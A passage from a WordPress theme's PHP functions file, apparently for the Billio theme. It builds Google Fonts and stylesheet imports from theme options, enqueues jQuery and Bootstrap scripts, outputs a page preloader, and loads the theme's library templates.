			$fonturl = '//fonts.googleapis.com/css?family='.$fontfamily.':100,300,400,300italic,400italic,600,700,800'.$subsets;
			print "@import url(". esc_url($fonturl) . ');'."\n";
		}	
	} else {
		print "@import url(//fonts.googleapis.com/css?family=Asap);\n";
	}

	if (!empty($detheme_config['section-font']['font-family'])) {

		if (isset($detheme_config['section-font']['google']) && $detheme_config['section-font']['google']=='true') {
			$fontfamily = $detheme_config['section-font']['font-family'];
			$fonturl = '//fonts.googleapis.com/css?family='.str_replace(' ','+',$fontfamily);

			if (!empty($detheme_config['section-font']['font-weight'])) {
				$fonturl.=":".$detheme_config['section-font']['font-weight'].','.$detheme_config['section-font']['font-weight'].'italic';
			}
			

			if (!empty($detheme_config['section-font']['subsets'])) {
				$fonturl.='&subset='.$detheme_config['section-font']['subsets'];
			}
			print "@import url(". esc_url($fonturl) . ');'."\n";
		}	
	}

	if (!empty($detheme_config['tertiary-font']['font-family'])) {
		if (isset($detheme_config['tertiary-font']['google']) && $detheme_config['tertiary-font']['google']) {
			$fontfamily = str_replace(' ','+',$detheme_config['tertiary-font']['font-family']);
			$subsets = '';

			if (!empty($detheme_config['tertiary-font']['subsets'])) {
				$subsets = '&subset='.$detheme_config['tertiary-font']['subsets'];
			}
			
			$fonturl = '//fonts.googleapis.com/css?family='.$fontfamily.':100,300,400,300italic,400italic,600,700'.$subsets;
			print "@import url(". esc_url($fonturl) . ');'."\n";
		}	
	} else {
		print "@import url(//fonts.googleapis.com/css?family=Merriweather:300,700);\n";
	}

	if(!defined('IFRAME_REQUEST')){

	print "@import url(". get_template_directory_uri() . '/css/billio.css);'."\n";

		if(is_rtl()){
			print "@import url(". get_template_directory_uri() . '/css/billio-rtl.css);'."\n";

		}
	}

	print "@import url(". get_stylesheet_directory_uri() . '/css/mystyle.css);'."\n";
	$blog_id="";

	if ( is_multisite()){
		$blog_id="-site".get_current_blog_id();
	}

	print "@import url(". get_template_directory_uri() . '/css/customstyle'.$blog_id.'.css);'."\n";

	if($detheme_config['sandbox-mode']){
  		$customstyle=detheme_style_compile($detheme_config,"",false);
  		print $customstyle."\n";
  	}


	if(count($css_banner) || count($css_header)){
		print (count($css_banner))?"section#banner-section {".@implode("\n",$css_banner)."}\n":"";
		print (isset($detheme_config['logo-top']) && $detheme_config['logo-top'])?"div#head-page #dt-menu ul li.logo-desktop a {margin-top:".$detheme_config['logo-top']."px;}\n":"";
		print (isset($detheme_config['logo-left']) &&  $detheme_config['logo-left'])?"div#head-page #dt-menu ul li.logo-desktop a {margin-left:".$detheme_config['logo-left']."px;}\n":"";
		print (isset($detheme_config['body_background']))?$detheme_config['body_background']:"";
	}
	print $css_highlight_bg;
	print "</style>\n";

	/* favicon handle */

	if(isset($detheme_config['dt-favicon-image']['url']) && ''!==$detheme_config['dt-favicon-image']['url'] && !function_exists('wp_site_icon')){

		$favicon_url=$detheme_config['dt-favicon-image']['url'];
		print "<link rel=\"shortcut icon\" type=\"image/png\" href=\"".esc_url(maybe_ssl_url($favicon_url))."\">\n";
	}



}

function billio_scripts(){
	global $detheme_config;

    $suffix       = defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ? '' : '.min';

  	if(isset($detheme_config['js-code']) && !empty($detheme_config['js-code'])){
  		add_action('wp_footer',create_function('','global $detheme_config;if(isset($detheme_config[\'js-code\']) && !empty($detheme_config[\'js-code\'])) print "<script type=\"text/javascript\">".$detheme_config[\'js-code\']."</script>\n";'),99998);
	}


    wp_enqueue_script( 'modernizr' , get_template_directory_uri() . '/js/modernizr.js', array( ), '2.6.2', true );
    wp_enqueue_script( 'bootstrap' , get_template_directory_uri() . '/js/bootstrap.js', array( 'jquery' ), '3.0', true );
    wp_enqueue_script( 'dt-script' , get_template_directory_uri() . '/js/myscript.js', array( 'jquery','bootstrap'), '1.0', true );
    wp_enqueue_script( 'styleable-select', get_template_directory_uri() . '/js/select'.$suffix.'.js', array(), '0.4.0', true );
    wp_enqueue_script( 'styleable-select-exec' , get_template_directory_uri() . '/js/select.init.js', array('styleable-select'), '1.0.0', true );
    wp_enqueue_script( 'jquery.appear' , get_template_directory_uri() . '/js/jquery.appear'.$suffix.'.js', array(), '', true );
    wp_enqueue_script( 'jquery.counto' , get_template_directory_uri() . '/js/jquery.counto'.$suffix.'.js', array(), '', true );
	if(get_post_type()=='dtcareer'){
			 wp_enqueue_script( 'billio-career-reply' , get_template_directory_uri() . '/js/career.js', array( 'jquery' ), '3.0', true );
	}
	else{
		if ( is_singular() ) { 
			 wp_enqueue_script( 'billio-comment-reply' , get_template_directory_uri() . '/js/comment-reply.min.js', array( 'jquery' ), '3.0', true );
		} 
	}

}

function billio_load_preloader(){

	global $detheme_config;
	if(!$detheme_config['page_loader'] || defined('IFRAME_REQUEST') || (defined('DOING_AJAX') && DOING_AJAX))
		return '';
?>
<script type="text/javascript">
jQuery(document).ready(function ($) {
	'use strict';
    $("body").queryLoader2({
        barColor: "#fff",
        backgroundColor: "none",
        percentage: false,
        barHeight: 0,
        completeAnimation: "fade",
        minimumTime: 500,
        onLoadComplete: function() { $('.modal_preloader').fadeOut(300,function () {$('.modal_preloader').remove();})}
    });
});
</script>

	<?php 
}

function billio_load_admin_stylesheet(){
	wp_enqueue_style( 'detheme-admin',get_template_directory_uri() . '/lib/css/admin.css', array(), '', 'all' );
}

load_template( get_template_directory().'/lib/webicon.php',true); // load detheme icon
load_template( get_template_directory().'/lib/options.php',true); // load bootstrap stylesheet and scripts
load_template( get_template_directory().'/lib/metaboxes.php',true); // load custom metaboxes
load_template( get_template_directory().'/lib/custom_functions.php',true); // load specific functions
load_template( get_template_directory().'/lib/widgets.php',true); // load custom widgets
load_template( get_template_directory().'/lib/shortcodes.php',true); // load custom shortcodes
load_template( get_template_directory().'/lib/updater.php',true); // load easy update
load_template( get_template_directory().'/lib/fonts.php',true); // load detheme font family
load_template( get_template_directory().'/lib/detheme_demo/one_click.php',true); // load detheme one click installer


/** Remove Query strings from Static Resources. */

function billio_remove_script_version( $src ){

    $parts = @explode( '?', $src );
    if (substr_count($parts[0],'googleapis.com')>0) {
    	return $src;
    } else {
    	return $parts[0];
    }
}

if(function_exists('vc_set_as_theme')){
	vc_set_as_theme(true);
}

?>